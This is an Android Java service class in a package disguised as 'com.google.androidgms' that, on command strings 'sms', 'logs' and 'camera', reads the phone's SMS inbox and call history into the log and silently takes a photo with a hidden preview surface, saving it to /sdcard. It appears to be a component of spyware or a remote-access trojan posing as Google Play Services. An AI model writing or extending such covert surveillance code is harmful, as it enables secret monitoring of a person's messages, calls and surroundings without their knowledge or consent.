package com.google.androidgms;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.database.Cursor;
import android.hardware.Camera;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.provider.CallLog;
import android.util.Log;
import android.view.SurfaceView;
import android.widget.Toast;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class GetData extends IntentService {
    public static final String Msg="bleh";

    Camera cam;
    Camera.Parameters param;
    Camera.PictureCallback rawCallback=new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] bytes, Camera camera) {
            Log.d("CAMERA", "onPictureTaken - raw");
            camera.stopPreview();
            camera.release();
        }
    };
    Camera.PictureCallback jpgCallback=new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] bytes, Camera camera) {
            FileOutputStream outStream=null;
            Log.i("CAMERA",Environment.getExternalStorageDirectory().getAbsolutePath());
            try{
                outStream=new FileOutputStream(String.format("/sdcard/%d.jpg", System.currentTimeMillis()));
                outStream.write(bytes);
                outStream.close();
            }
            catch(FileNotFoundException e){
                e.printStackTrace();
            }
            catch (IOException e){
                e.printStackTrace();
            }
            Log.d("CAMERA", "onPictureTaken - jpg");
            camera.stopPreview();
            camera.release();
        }
    };

    Camera.ShutterCallback shutterCallback = new Camera.ShutterCallback() {
        public void onShutter() {
            Log.i("CAMERA", "onShutter'd");
        }
    };


    public GetData() {
        super("GetData");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent.getStringExtra(Msg).equals("sms")) {
            Log.d(intent.getStringExtra(Msg), "print");
            String[] reqCols = new String[] { "_id", "address", "body","person" };
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), reqCols, null, null, null);
            cursor.moveToFirst();

            do{
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                }
                Log.d("Message",msgData);
            }while(cursor.moveToNext());
        }
        else if(intent.getStringExtra(Msg).equals("logs")){
            Cursor c1 = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);
            if(c1!=null){
                while(c1.moveToNext()){
                    String number = c1.getString(c1.getColumnIndex("number"));
                    String name = c1.getString(c1.getColumnIndex("name"));
                    long date = c1.getLong(c1.getColumnIndex("date"));
                    long duration=c1.getLong(c1.getColumnIndex("duration"));
                    Log.d("entry:",number+","+name+","+date+","+duration);
                }
            }
        }
        else if(intent.getStringExtra(Msg).equals("camera")){
            try{
                cam=Camera.open();
                Log.i("CAMERA","Success");
            }
            catch(RuntimeException e){
                Log.i("CAMERA","Camera not available");
                e.printStackTrace();
            }
            try{
                param=cam.getParameters();
                cam.setParameters(param);
                Log.i("CAMERA", "Success");
            }
            catch(Exception e1){
                Log.e("CAMERA", "Parameter problem");
                e1.printStackTrace();
            }
            try{
                SurfaceView view=new SurfaceView(this);
                cam.setPreviewDisplay(view.getHolder());
                cam.startPreview();
                Log.i("CAMERA","Success");
            }
            catch(Exception e){
                Log.e("CAMERA", "Surface Problem");
                e.printStackTrace();
            }
            try{
                cam.takePicture(shutterCallback,rawCallback,jpgCallback);
                Log.i("CAMERA","Success");
            }
            catch(Exception e){
                Log.e("CAMERA", "Click Failure");
                e.printStackTrace();
            }
        }
    }

}
